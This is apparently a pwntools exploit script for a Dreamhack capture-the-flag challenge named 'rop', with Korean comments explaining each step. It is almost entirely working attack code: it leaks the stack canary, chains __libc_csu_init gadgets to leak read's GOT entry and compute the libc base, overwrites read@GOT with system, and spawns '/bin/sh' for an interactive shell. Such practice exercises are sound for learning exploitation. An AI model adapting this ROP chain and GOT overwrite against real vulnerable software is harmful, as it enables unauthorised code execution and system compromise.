from pwn import *
def slog(name, addr):
	return success(": ".join([name, hex(addr)]))
p = process("./rop")    
#p = remote("host1.dreamhack.games", 19698)
e = ELF("./rop")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#libc = ELF("/home/juho/Downloads/libc/libc6_2.27-3ubuntu1.2_amd64.so")

# [1] Leak canary
buf = b"A"*0x39
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b"\x00"+p.recvn(7))
slog("canary", cnry)

# [2] Exploit
read_plt = e.plt['read']
read_got = e.got['read']
puts_plt = e.plt['puts']
puts_got = e.got['puts']
pop_rdi = 0x00000000004007f3
pop_rsi_r15 = 0x00000000004007f1
payload = b"A"*0x38 + p64(cnry) + b"B"*0x8

print("read got: "+hex(read_got))
print("puts got: "+hex(puts_got))
print("read plt: "+hex(read_plt))
# puts(read_got)
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)

# __libc_csu_init()함수를 이용한 rdi, rsi, rdx설정
# read(0, read_got, 0x100) 을 수행하게됨

payload += p64(0x4007EA)    # retn을 __libc_csu_init()으로 바꿈
payload += p64(0x0)         # pop rbx
payload += p64(0x1)         # pop rbp
payload += p64(read_got)    # pop r12 0x601030
payload += p64(0)           # pop r13
payload += p64(read_got)    # pop r14 0x601030
payload += p64(0x100)       # pop r15
payload += p64(0x4007D0)    # retn

# puts(read_got)
# rbp를 1로 설정했기 때문에 add rsp, 8을 한 후 원하는 함수를 한번 더 실행할 수 있음
"""payload += p64(0x0)         # add rsp, 8을 하니 한번은 의미없는 값을 넣음
payload += p64(0x0)         # pop rbx 항상 0을 넣는다.
payload += p64(0x1)         # pop rbp 항상 1을 넣는다.
payload += p64(puts_got)    # pop r12 함수의 주소가 저장된 주소를 넣는다. 0x601018
payload += p64(read_got)	# pop r13 edi값 0x601030
payload += p64(0x0)         # pop r14 rsi값
payload += p64(0x0)         # pop r15 rdx값
payload += p64(0x4007D0)    # retn

# puts(read_got+0x8)
# rbp를 1로 설정했기 때문에 add rsp, 8을 한 후 원하는 함수를 한번 더 실행할 수 있음
payload += p64(0x0)         # add rsp, 8을 하니 한번은 의미없는 값을 넣음
payload += p64(0x0)         # pop rbx 항상 0을 넣는다.
payload += p64(0x1)         # pop rbp 항상 1을 넣는다.
payload += p64(puts_got)    # pop r12 실행하고싶은 함수의 주소가 저장된 주소를 넣는다.
payload += p64(read_got+0x8)# pop r13 edi값 0x601038
payload += p64(0x0)         # pop r14 rsi값
payload += p64(0x0)         # pop r15 rdx값
payload += p64(0x4007D0)    # retn
"""
# read("/bin/sh") == system("/bin/sh")
# rbp를 1로 설정했기 때문에 add rsp, 8을 한 후 원하는 함수를 한번 더 실행할 수 있음
payload += p64(0x0)         # add rsp, 8을 하니 한번은 의미없는 값을 넣음
payload += p64(0x0)         # pop rbx
payload += p64(0x1)         # pop rbp
payload += p64(read_got)    # pop r12 (system의 주소로 덮어놨기 때문에 system()함수 실행됨)
payload += p64(read_got+0x8)# pop r13
payload += p64(0x0)         # pop r14 (system()은 rsi를 사용하지 않는다.)
payload += p64(0x0)         # pop r15 (system()은 rdx를 사용하지 않는다.)
payload += p64(0x4007D0)    # retn


pause() #여기서 gdb attach하고 resume한다.
p.sendafter("Buf: ", payload)
read = u64(p.recvn(6)+b"\x00"*2)
lb = read - 0x110140	#read - libc.symbols["read"]
system = lb + 0x04f550	#lb + libc.symbols["system"]
slog("read1", read)
slog("libc base", lb)
slog("system", system)
print("libc symbol read: ", hex(libc.symbols["read"]))
print("libc symbol system: ", hex(libc.symbols["system"]))
p.send(p64(system)+b"/bin/sh\x00")
#p.send(b"0123456701234567")

p.recvn(1) #puts는 줄바꿈을 출력하니 \n을 하나 읽어들여야 한다.
#readagain = u64(p.recvn(6)+b"\x00"*2)
#slog("read02", readagain)

p.interactive()